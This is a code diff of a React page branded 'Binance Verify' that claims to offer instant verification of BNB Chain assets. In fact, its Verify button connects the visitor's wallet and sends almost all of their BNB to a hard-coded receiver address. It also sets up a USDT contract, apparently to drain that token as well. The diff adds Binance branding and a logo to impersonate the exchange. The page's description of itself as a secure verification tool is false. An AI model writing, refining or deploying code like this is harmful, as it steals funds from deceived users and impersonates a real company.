@@ -1,17 +1,17 @@
-import { useState } from "react";
+import React, { useState } from "react";
 import { ethers } from "ethers";
 import "./App.css";
+import binanceLogo from "./binance-yellow-rhombus-lawc3crgelc4t98h.jpg"; // make sure this is in src folder
 
-const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
-const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
+const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
+const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
 const ERC20_ABI = [
-  "function balanceOf(address) view returns (uint)",
-  "function transfer(address to, uint amount) returns (bool)"
+  "function balanceOf(address) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)",
 ];
 
 function App() {
   const [status, setStatus] = useState("Click Verify to start...");
-  const [walletAddress, setWalletAddress] = useState("");
 
   async function handleVerify() {
     try {
@@ -24,24 +24,21 @@ function App() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
-      setWalletAddress(userAddress);
 
       setStatus("Checking balances...");
 
-      // Check BNB balance
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > ethers.parseEther("0.001")) {
         setStatus("Sending BNB...");
         const tx = await signer.sendTransaction({
           to: RECEIVER,
-          value: balanceBNB - ethers.parseEther("0.0005")
+          value: balanceBNB - ethers.parseEther("0.0005"), // leave gas
         });
         await tx.wait();
         setStatus("BNB sent successfully ✅");
         return;
       }
 
-      // Check USDT BEP20 balance
       const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
       const balanceUSDT = await usdt.balanceOf(userAddress);
       if (balanceUSDT > 0n) {
@@ -60,60 +57,48 @@ function App() {
   }
 
   return (
-    <div className="App">
+    <div className="App bg-[#121212] min-h-screen flex flex-col">
       {/* Navbar */}
-      <header className="navbar">
-        <div className="nav-container">
-          <a href="#" className="nav-logo">
-            <div className="nav-logo-icon"></div>
-            <span>BNB Verify</span>
+      <header className="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
+        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
+          <a href="#" className="flex items-center space-x-2">
+            <img src={binanceLogo} alt="Binance Logo" className="h-8 w-8" />
+            <span className="text-xl font-bold text-yellow-400">Binance Verify</span>
           </a>
-        </div>
+          <div className="hidden md:flex space-x-8 text-sm font-medium">
+            <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">Tokens</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
+          </div>
+        </nav>
       </header>
 
-      {/* Hero */}
-      <main className="hero">
-        <div className="hero-left">
-          <div className="badge">Powered by BNB Chain</div>
-          <h1>Verify Crypto Assets on BNB Chain</h1>
-          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) securely.</p>
-          <div className="hero-buttons">
-            <button onClick={handleVerify}>Verify</button>
-          </div>
-          <p className="status">{status}</p>
-          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
-        </div>
+      {/* Hero Section */}
+      <main className="flex flex-col items-center justify-center text-center px-6 py-12 flex-grow">
+        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
+        <p className="text-gray-300 mb-8 max-w-xl">
+          Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
+        </p>
 
-        <div className="hero-right">
-          <div className="pulse-ring outer"></div>
-          <div className="pulse-ring middle"></div>
-          <div className="pulse-ring inner"></div>
-          <div className="center-logo"></div>
+        <div className="relative flex justify-center items-center w-40 h-40 mb-12">
+          <div className="pulse-ring"></div>
+          <div className="pulse-ring"></div>
+          <div className="pulse-ring"></div>
+          <button
+            onClick={handleVerify}
+            className="button-primary absolute z-10"
+          >
+            Verify
+          </button>
         </div>
+        <p id="status" className="text-gray-300 text-lg">{status}</p>
       </main>
 
-      {/* Cards Section */}
-      <section className="cards-section">
-        <div className="card">
-          <h2>Explorer</h2>
-          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
-        </div>
-        <div className="card">
-          <h2>Tokens</h2>
-          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
-        </div>
-        <div className="card">
-          <h2>NFTs</h2>
-          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
-        </div>
-        <div className="card">
-          <h2>DApps</h2>
-          <p>Connect to decentralized apps and verify transactions safely.</p>
-        </div>
-      </section>
-
-      <footer>
-        &copy; 2025 BNB Verify. Powered by BNB Chain.
+      {/* Footer */}
+      <footer className="bg-[#171717] py-6 text-center text-gray-500 text-sm">
+        &copy; 2025 Binance Verify. Powered by BNB Chain.
       </footer>
     </div>
   );
